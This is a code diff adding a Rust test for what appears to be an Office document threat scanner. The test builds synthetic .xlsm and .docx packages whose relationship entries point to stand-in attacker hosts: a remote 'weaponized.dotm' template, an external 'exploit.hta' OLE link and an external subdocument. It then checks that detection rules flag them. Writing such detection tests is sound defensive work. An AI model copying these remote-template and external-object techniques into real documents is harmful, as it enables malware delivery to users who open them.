@@ -2415,3 +2415,169 @@ fn e2e_advanced_radix_lookup_and_unicode_cell_threat_detection() {
         "E1 should resolve to payload URL: {threats:?}"
     );
 }
+
+#[test]
+fn e2e_ooxml_container_package_threat_inspection() {
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project("PkgThreatProj", &[("ThisWorkbook", src, &pcode)], &["Safe"]);
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
+    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
+    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>";
+    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+        <Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://c2.example.com/templates/weaponized.dotm\" TargetMode=\"External\"/>\
+        <Relationship Id=\"rId4\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"http://attacker.example.com/exploit.hta\" TargetMode=\"External\"/>\
+        <Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument\" Target=\"http://attacker.example.com/subdoc.docx\" TargetMode=\"External\"/>\
+    </Relationships>";
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><v>100</v></c></row></sheetData></worksheet>";
+    let ole_payload = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1DummyEquationPayload";
+    let activex_payload = b"ActiveXBinaryBlobData";
+
+    let xlsm = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", pkg_rels.as_bytes()),
+        ("xl/workbook.xml", wb.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+        ("xl/embeddings/oleObject1.bin", ole_payload),
+        ("xl/activeX/activeX1.bin", activex_payload),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // Verify VBA-CELL-010: Remote Template Injection
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "RemoteTemplateInjection"
+                && t.severity == "Critical"
+                && t.formula
+                    .contains("https://c2.example.com/templates/weaponized.dotm")),
+        "Should detect RemoteTemplateInjection (VBA-CELL-010): {threats:?}"
+    );
+
+    // Verify VBA-CELL-011: Embedded OLE Package
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "EmbeddedOlePackage"
+            && t.severity == "High"
+            && t.coordinate == "part:xl/embeddings/oleObject1.bin"),
+        "Should detect EmbeddedOlePackage (VBA-CELL-011): {threats:?}"
+    );
+
+    // Verify VBA-CELL-012: External OLE Object Link
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "ExternalOleObject"
+            && t.severity == "High"
+            && t.formula
+                .contains("http://attacker.example.com/exploit.hta")),
+        "Should detect ExternalOleObject (VBA-CELL-012): {threats:?}"
+    );
+
+    // Verify VBA-CELL-013: Embedded ActiveX Control
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "ActiveXControl"
+            && t.severity == "Medium"
+            && t.coordinate == "part:xl/activeX/activeX1.bin"),
+        "Should detect ActiveXControl (VBA-CELL-013): {threats:?}"
+    );
+
+    // Verify VBA-CELL-014: External Subdocument Reference
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExternalSubdocument"
+                && t.severity == "High"
+                && t.formula
+                    .contains("http://attacker.example.com/subdoc.docx")),
+        "Should detect ExternalSubdocument (VBA-CELL-014): {threats:?}"
+    );
+
+    // Verify SARIF export contains all 5 rules (VBA-CELL-010 through 014)
+    let sarif = inspection_to_sarif(&inspection, "threats.xlsm");
+    assert!(
+        sarif.contains("\"ruleId\":\"VBA-CELL-010\""),
+        "SARIF missing VBA-CELL-010"
+    );
+    assert!(
+        sarif.contains("\"ruleId\":\"VBA-CELL-011\""),
+        "SARIF missing VBA-CELL-011"
+    );
+    assert!(
+        sarif.contains("\"ruleId\":\"VBA-CELL-012\""),
+        "SARIF missing VBA-CELL-012"
+    );
+    assert!(
+        sarif.contains("\"ruleId\":\"VBA-CELL-013\""),
+        "SARIF missing VBA-CELL-013"
+    );
+    assert!(
+        sarif.contains("\"ruleId\":\"VBA-CELL-014\""),
+        "SARIF missing VBA-CELL-014"
+    );
+    assert!(
+        sarif.contains("\"kind\":\"relationship\""),
+        "SARIF missing relationship logical location"
+    );
+    assert!(
+        sarif.contains("\"kind\":\"part\""),
+        "SARIF missing part logical location"
+    );
+
+    // Verify JSON export contains rule_ids
+    let json = inspect_to_json(&inspection, Disclosure::StructureOnly);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-010\""),
+        "JSON missing VBA-CELL-010"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-011\""),
+        "JSON missing VBA-CELL-011"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-012\""),
+        "JSON missing VBA-CELL-012"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-013\""),
+        "JSON missing VBA-CELL-013"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-014\""),
+        "JSON missing VBA-CELL-014"
+    );
+
+    // Now test weaponized macro-less DOCX container (no vbaProject.bin inside!)
+    let docx_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://remote.c2.server/payload.dotm\" TargetMode=\"External\"/>\
+    </Relationships>";
+    let docx = synthesize_zip(&[
+        ("word/_rels/settings.xml.rels", docx_rels.as_bytes()),
+        ("word/embeddings/exploit.bin", b"EmbeddedPackagerPayload"),
+    ]);
+
+    let extracted_docx = extract_macro_container(&docx, &Limits::default())
+        .expect("extract_macro_container on weaponized macro-less DOCX should succeed");
+    assert_eq!(extracted_docx.modules.len(), 0);
+    assert_eq!(extracted_docx.cell_threats.len(), 2);
+    assert!(
+        extracted_docx
+            .cell_threats
+            .iter()
+            .any(|t| t.threat_kind == "RemoteTemplateInjection"),
+        "DOCX should detect RemoteTemplateInjection"
+    );
+    assert!(
+        extracted_docx
+            .cell_threats
+            .iter()
+            .any(|t| t.threat_kind == "EmbeddedOlePackage"),
+        "DOCX should detect EmbeddedOlePackage"
+    );
+}
